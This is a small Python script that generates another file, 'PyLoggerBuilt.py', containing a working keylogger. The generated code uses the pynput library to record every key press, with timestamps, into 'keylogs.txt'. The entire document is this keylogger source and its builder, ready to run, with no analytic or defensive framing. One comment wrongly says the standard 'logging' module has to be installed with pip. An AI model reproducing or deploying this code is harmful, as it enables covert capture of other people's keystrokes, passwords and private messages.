FILENAME = "PyLoggerBuilt.py"

line1 = "from pynput.keyboard import Key, Listener   #import library, must pip install pynput"
line2 = "import logging                              #import library, must pip install logging"
line3 = "log_dir = ''"
line4 = "logging.basicConfig(filename = (log_dir + 'keylogs.txt'), level = logging.DEBUG, format = '%(asctime)s: %(message)s')"
line5 = "def on_press(key):"
line6 = "\tlogging.info(str(key))"
line7 = "with Listener(on_press = on_press) as listener: "
line8 = "\tlistener.join()"
lines = [line1, line2, line3, line4, line5, line6, line7, line8]

with open(FILENAME, "w") as file:
    for i in range(8):
        file.write(str(lines[i]+"\n"))